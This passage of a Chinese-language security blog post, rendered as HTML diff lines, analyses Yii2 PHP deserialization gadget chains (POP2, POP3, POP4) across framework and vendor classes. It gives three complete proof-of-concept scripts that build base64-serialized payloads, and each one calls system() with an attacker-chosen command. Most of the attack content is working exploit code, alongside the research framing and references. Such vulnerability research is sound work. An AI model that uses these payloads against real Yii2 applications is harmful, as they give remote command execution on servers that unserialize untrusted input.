+<p>新加了一个<code>__wakeup()</code>方法，但该类被反序列化时被触发，在<code>__wakeup()</code>方法中，会抛出一个异常，从而修复了该漏洞。</p>
+<h2 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h2><p>同POP1，从<code>yii2/db/BatchQueryResult.php</code>入手，但现在换种思路，我们不找<code>__call</code>方法来触发，直接找<code>close</code>方法</p>
+<p>全局搜索close()方法，且没有参数：</p>
+<img src="img/yii反序列化漏洞/image-20210623115906214.png" srcset="/img/loading.gif" lazyload alt="image-20210623115906214" style="zoom: 33%;" />
+
+<p>发现 DbSession.php 可以利用</p>
+<p>web/DbSession.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)						//<span class="hljs-title">line</span>:146-153</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;getIsActive()) &#123;<br>            <span class="hljs-comment">// prepare writeCallback fields before session closes</span><br>            <span class="hljs-keyword">$this</span>-&gt;fields = <span class="hljs-keyword">$this</span>-&gt;composeFields();<br>            YII_DEBUG ? session_write_close() : @session_write_close();<br>        &#125;<br>    &#125;<br>……<br></code></pre></td></tr></table></figure>
+
+<p>追踪 composeFields 函数，来到DbSession继承的类MultiFieldSession</p>
+<p>web/MultiFieldSession.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Session</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$writeCallback</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">composeFields</span>(<span class="hljs-params"><span class="hljs-variable">$id</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span></span>)			//<span class="hljs-title">line</span>:96-106</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$fields</span> = <span class="hljs-keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="hljs-keyword">$this</span>-&gt;writeCallback, <span class="hljs-keyword">$this</span>) : [];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$fields</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span> !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-variable">$fields</span>[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-variable">$data</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fields</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在敏感函数<code>call_user_func($this-&gt;writeCallback, $this)</code>，其中<code>$this-&gt;writeCallback</code> 可控，但<code>$this</code>我们很难使其控制为一个函数的参数。那我们就考虑让这个<code>call_user_func</code>调用其他类的敏感方法，如 POP1 中的 <code>yii\rest\IndexAction::run-&gt;call_user_func()</code></p>
+<blockquote>
+<p>这里就有一个知识点，在pop1中，我们使用 call_user_func_array() 调用了其他类的方法，其中第一个参数为其他类类名，其他类的函数名构成的数组，而 call_user_func 也具有这个功能</p>
+<p>这个知识点参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p>
+</blockquote>
+<p>最终构成利用链：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">POP2：<br>yii\db\BatchQueryResult::__destruct()-&gt;reset()<br>-&gt;<br>\yii\web\DbSession::close -&gt; MultiFieldSession::composeFields -&gt; call_user_func(<span class="hljs-variable">$this</span>-&gt;writeCallback, <span class="hljs-variable">$this</span>)<br>-&gt;<br>\yii\rest\IndexAction::run-&gt;call_user_func()<br></code></pre></td></tr></table></figure>
+
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title">payload</span> = <span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>();<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$payload</span>));<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$writeCallback</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls -al&#x27;</span>;           <span class="hljs-comment">//command</span><br>            <span class="hljs-comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h2><p>POP3和POP4，将寻找新的利用链，通过全局搜索<code>__destruct()|__wakeup()</code>寻找触发点</p>
+<p>最终找到</p>
+<p>vendor/codeception/codeception/ext/RunProcess.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Extension</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) //<span class="hljs-title">line</span>:93-109</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;stopProcess();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopProcess</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (array_reverse(<span class="hljs-keyword">$this</span>-&gt;processes) <span class="hljs-keyword">as</span> <span class="hljs-variable">$process</span>) &#123;<br>            <span class="hljs-comment">/** <span class="hljs-doctag">@var</span> $process Process  **/</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$process</span>-&gt;isRunning()) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;output-&gt;debug(<span class="hljs-string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="hljs-variable">$process</span>-&gt;getCommandLine());<br>            <span class="hljs-variable">$process</span>-&gt;stop();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;processes = [];<br>    &#125;<br>  ……<br></code></pre></td></tr></table></figure>
+
+<p><code>__destruct()</code>析构的时候，调用<code>stopProcess()</code>，而函数中的<code>this-&gt;processes</code>可控，也就意味着<code>$process</code>可控。而因为<code>$process</code>调用<code>isRunning()</code>函数进行判断，这个不在类中，会触发<code>__call()</code>方法。</p>
+<p>至于后面的嘛，就可以接上第一条利用链POP1的<code>__call()</code>方法开头的后半段，完成一个新的POP链</p>
+<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls -al&#x27;</span>;           <span class="hljs-comment">//command</span><br>            <span class="hljs-comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;isRunning&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction, <span class="hljs-string">&#x27;run&#x27;</span>];<br>            <span class="hljs-comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RunProcess</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$processes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;processes = [<span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>()];<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Codeception</span>\<span class="hljs-title">Extension</span>\<span class="hljs-title">RunProcess</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> RunProcess()));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="POP4"><a href="#POP4" class="headerlink" title="POP4"></a>POP4</h2><p>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Swift_KeyCache</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearKey</span>(<span class="hljs-params"><span class="hljs-variable">$nsKey</span>, <span class="hljs-variable">$itemKey</span></span>)		//<span class="hljs-title">line</span>:212-218</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hasKey(<span class="hljs-variable">$nsKey</span>, <span class="hljs-variable">$itemKey</span>)) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;freeHandle(<span class="hljs-variable">$nsKey</span>, <span class="hljs-variable">$itemKey</span>);<br>            unlink(<span class="hljs-keyword">$this</span>-&gt;path.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$nsKey</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$itemKey</span>);<br>        &#125;<br>    &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearAll</span>(<span class="hljs-params"><span class="hljs-variable">$nsKey</span></span>)				//<span class="hljs-title">line</span>:225-236</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (array_key_exists(<span class="hljs-variable">$nsKey</span>, <span class="hljs-keyword">$this</span>-&gt;keys)) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;keys[<span class="hljs-variable">$nsKey</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$itemKey</span> =&gt; <span class="hljs-variable">$null</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;clearKey(<span class="hljs-variable">$nsKey</span>, <span class="hljs-variable">$itemKey</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (is_dir(<span class="hljs-keyword">$this</span>-&gt;path.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$nsKey</span>)) &#123;<br>                rmdir(<span class="hljs-keyword">$this</span>-&gt;path.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$nsKey</span>);<br>            &#125;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;keys[<span class="hljs-variable">$nsKey</span>]);<br>        &#125;<br>    &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)							//<span class="hljs-title">line</span>:289-294</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;keys <span class="hljs-keyword">as</span> <span class="hljs-variable">$nsKey</span> =&gt; <span class="hljs-variable">$null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;clearAll(<span class="hljs-variable">$nsKey</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>__destruct</code>调用<code>clearAll()</code>方法</p>
+</li>
+<li><p>跟进到<code>clearAll()</code>，调用<code>clearKey()</code></p>
+</li>
+<li><p>调用<code>clearKey()</code>，这里的<code>unlink</code>用到了拼接字符串，而<code>this-&gt;path</code>可控，所以就调用<code>__toString()</code>方法：</p>
+</li>
+</ul>
+<p>接下来需要找到可以利用的<code>__toString()</code>魔术方法来触发后续操作。</p>
+<p>全局搜索一下<code>__toString()</code>方法：<code>function __toString\(\)</code>，可以发现不少的方法，以<code>\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString</code>为例，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) : <span class="hljs-title">string</span></span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;refers . (<span class="hljs-keyword">$this</span>-&gt;description ? <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;description-&gt;render() : <span class="hljs-string">&#x27;&#x27;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>$this-&gt;refers</code>和<code>$this-&gt;description</code>可控。同时它在调用<code>render()</code>时会调用<code>__call</code>魔术方法。</p>
+<p>之后就与POP1的后半段链一样了。</p>
+<p>完整的POP链如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">POP4:<br>\Swift_KeyCache_DiskKeyCache::__destruct -&gt; clearAll -&gt; clearKey -&gt; __toString<br>-&gt; <br>\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -&gt; render<br>-&gt; <br>Faker\<span class="hljs-built_in">Generator</span>::__call()-&gt;format() -&gt; call_user_func_array()<br>-&gt;<br>\yii\rest\IndexAction::run -&gt; call_user_func()<br></code></pre></td></tr></table></figure>
+
+<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -&gt; __toString -&gt; __call</span><br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">Covers</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$path</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$keys</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;V0W&quot;</span> =&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;is&quot;</span>, <span class="hljs-string">&quot;Ca1j1&quot;</span>)<br>            );  <span class="hljs-comment">//注意 ClearAll中的数组解析了两次，之后再unlink</span><br>            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> Covers();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> Swift_KeyCache_DiskKeyCache();<br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$payload</span>));<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Covers</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$refers</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$description</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>            <span class="hljs-keyword">$this</span>-&gt;refers = <span class="hljs-string">&quot;AnyStringisOK&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;ls -al&#x27;</span>;           <span class="hljs-comment">//command</span><br>            <span class="hljs-comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction, <span class="hljs-string">&#x27;run&#x27;</span>];<br>            <span class="hljs-comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>演示：</p>
+<p>虽然报错还是能执行命令</p>
+<p><img src="img/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210623161041092.png" srcset="/img/loading.gif" lazyload alt="image-20210623161041092"></p>
+<p>参考：</p>
+<p>Yii 官方文档：<a target="_blank" rel="noopener" href="https://www.yiichina.com/doc">https://www.yiichina.com/doc</a></p>
+<p>Yii2 官方仓库：<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2">https://github.com/yiisoft/yii2</a></p>
+<p><strong>米斯特团队</strong>全过程介绍：<a target="_blank" rel="noopener" href="https://v0w.top/2020/09/22/Yii2unserialize">https://v0w.top/2020/09/22/Yii2unserialize</a></p>
+<p>大佬的有趣挖链过程，结果同上：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6874149010832097294">https://juejin.cn/post/6874149010832097294</a></p>
